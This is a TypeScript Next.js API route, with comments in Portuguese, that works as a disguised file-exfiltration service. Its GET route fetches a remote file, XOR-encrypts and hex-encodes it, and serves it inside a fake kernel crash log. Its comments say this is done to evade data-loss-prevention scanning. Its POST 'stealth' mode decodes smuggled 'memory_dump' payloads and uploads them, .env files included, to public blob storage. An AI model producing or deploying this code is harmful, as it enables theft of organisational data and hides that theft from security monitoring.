import { put, del } from '@vercel/blob';
import { NextResponse } from 'next/server';
import zlib from 'zlib';
import { promisify } from 'util';

const gunzip = promisify(zlib.gunzip);

// --- Utilitários de Criptografia ---

const hexToBinaryString = (hex: string) => {
  let str = '';
  for (let i = 0; i < hex.length; i += 2) {
    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  }
  return str;
};

const xorDecrypt = (input: string, key: string) => {
  let result = "";
  for (let i = 0; i < input.length; i++) {
    result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return result;
};

// XOR Encrypt para o Download (Buffer -> String Binária)
const xorEncryptBuffer = (buffer: Buffer, key: string) => {
  let result = "";
  for (let i = 0; i < buffer.length; i++) {
    result += String.fromCharCode(buffer[i] ^ key.charCodeAt(i % key.length));
  }
  return result;
};

// String para Hex (Visual de Dump de Memória)
const stringToHex = (str: string) => {
  let hex = '';
  for (let i = 0; i < str.length; i++) {
    hex += str.charCodeAt(i).toString(16).padStart(2, '0');
  }
  return hex;
};

// --- ROTAS ---

// Rota GET: Proxy de Download Camuflado (NOVO)
export async function GET(request: Request): Promise<NextResponse> {
  const SECRET = process.env.AUDIT_SECRET;
  const token = request.headers.get('x-audit-token');

  if (!SECRET || token !== SECRET) {
    return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
  }

  const { searchParams } = new URL(request.url);
  const fileUrl = searchParams.get('url');

  if (!fileUrl) {
    return NextResponse.json({ error: 'URL do arquivo necessária' }, { status: 400 });
  }

  try {
    // 1. O Servidor baixa o arquivo original (Bypass de CORS e acesso direto do cliente)
    const upstreamRes = await fetch(fileUrl);
    if (!upstreamRes.ok) throw new Error('Falha ao buscar arquivo na origem');

    const arrayBuffer = await upstreamRes.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    // 2. Criptografa o conteúdo (XOR com o Token)
    // Isso remove qualquer assinatura de arquivo (Magic Bytes) que o DLP procure
    const encryptedBinary = xorEncryptBuffer(buffer, SECRET);

    // 3. Converte para Hexadecimal
    // O tráfego de rede será puramente texto alfanumérico (0-9, A-F)
    const hexDump = stringToHex(encryptedBinary);

    // 4. Cria o cabeçalho e rodapé de um "Crash Log" falso
    const fakeLogContent = `
[SYSTEM_CRASH_REPORT_V7]
TIMESTAMP: ${new Date().toISOString()}
ERROR_CODE: 0xDEADBEEF
MODULE: KERNEL_PANIC_HANDLER
--------------------------------------------------
MEMORY_DUMP_START
${hexDump}
MEMORY_DUMP_END
--------------------------------------------------
Integrity Check: PASSED
User-Agent: SystemService/1.0
`.trim();

    // 5. Retorna como arquivo .log (Text Plain)
    // DLP vê: text/plain, extensão .log, conteúdo parece log de erro.
    return new NextResponse(fakeLogContent, {
      headers: {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Disposition': `attachment; filename="system_error_${Date.now()}.log"`
      }
    });

  } catch (error) {
    console.error('Download Proxy Error:', error);
    return NextResponse.json({ error: 'Falha no download seguro' }, { status: 500 });
  }
}

export async function POST(request: Request): Promise<NextResponse> {
  // ... (Código do POST permanece IDÊNTICO ao anterior) ...
  const SECRET = process.env.AUDIT_SECRET;
  if (!SECRET) return NextResponse.json({ error: 'Configuração ausente' }, { status: 500 });

  const token = request.headers.get('x-audit-token');
  if (token !== SECRET) return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });

  const { searchParams } = new URL(request.url);
  let filename = searchParams.get('filename');
  const mode = searchParams.get('mode');

  // Validação de extensão apenas se não for stealth
  const allowedExtensions = ['.txt', '.docx', '.doc', '.png', '.jpg', '.jpeg', '.gif', '.log', '.csv', '.xlsx', '.xls', '.pdf', '.json', '.zip', '.rar', '.py', '.js', '.jsx', '.ts', '.tsx', '.java', '.c', '.cpp', '.cs', '.go', '.rb', '.php', '.sh', '.bat', '.sql', '.html', '.css', '.xml', '.yaml', '.yml', '.md', '.env', '.ini', '.dat', '.bin'];

  if (filename) {
    const isAllowedURL = allowedExtensions.some(ext => filename!.toLowerCase().endsWith(ext));
    if (!isAllowedURL) return NextResponse.json({ error: 'Extensão bloqueada' }, { status: 403 });
  }

  let fileBody;

  if (mode === 'stealth') {
    try {
      const jsonBody = await request.json();
      const dumpHex = jsonBody.memory_dump;
      if (!dumpHex) throw new Error('Dump ausente');

      const encryptedBinary = hexToBinaryString(dumpHex);
      const decryptedData = xorDecrypt(encryptedBinary, SECRET);

      const separatorIndex = decryptedData.indexOf('::');
      if (separatorIndex === -1) throw new Error('Formato inválido');

      filename = decryptedData.substring(0, separatorIndex);
      const contentBase64 = decryptedData.substring(separatorIndex + 2);

      const base64Clean = contentBase64.includes(',') ? contentBase64.split(',').pop() : contentBase64;
      let buffer = Buffer.from(base64Clean!, 'base64');

      try { buffer = await gunzip(buffer); } catch (e) { console.warn("Gunzip skip"); }
      fileBody = buffer;
    } catch (e) {
      return NextResponse.json({ error: 'Stealth fail' }, { status: 400 });
    }
  } else {
    if (!request.body) return NextResponse.json({ error: 'Body vazio' }, { status: 400 });
    fileBody = request.body;
  }

  try {
    if (!filename) filename = `upload_${Date.now()}.bin`;
    const blob = await put(filename, fileBody, { access: 'public' });
    return NextResponse.json(blob);
  } catch (error) {
    return NextResponse.json({ error: 'Upload error' }, { status: 500 });
  }
}

export async function DELETE(request: Request): Promise<NextResponse> {
  const SECRET = process.env.AUDIT_SECRET;
  const token = request.headers.get('x-audit-token');
  if (!SECRET || token !== SECRET) return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
  const { searchParams } = new URL(request.url);
  const urlToDelete = searchParams.get('url');
  if (urlToDelete) {
    await del(urlToDelete);
    return NextResponse.json({ success: true });
  }
  return NextResponse.json({ error: 'URL ausente' }, { status: 400 });
}